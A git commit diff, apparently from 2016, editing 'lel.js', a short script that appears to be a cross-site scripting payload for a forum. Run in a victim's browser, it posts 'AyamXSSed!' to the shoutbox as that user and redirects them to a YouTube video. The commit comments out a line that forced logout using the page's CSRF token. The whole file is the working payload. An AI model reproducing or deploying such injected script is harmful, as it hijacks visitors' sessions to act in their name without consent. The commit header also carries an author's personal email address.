1abaf4cd4fe5a209cb36435fdde1364597ca041d
izham87 <ahmadalbab99@gmail.com>
2016-03-18 12:23:04 +0800

    Update lel.js

--- lel.js
+++ lel.js
@@ -1,3 +1,3 @@
 socket.emit("plugins.shoutbox.send", {message: 'AyamXSSed!'});
-app.logout({csrf:config.csrf_token});
+//app.logout({csrf:config.csrf_token});
 window.location = "https://www.youtube.com/watch?v=vx2u5uUu3DE";
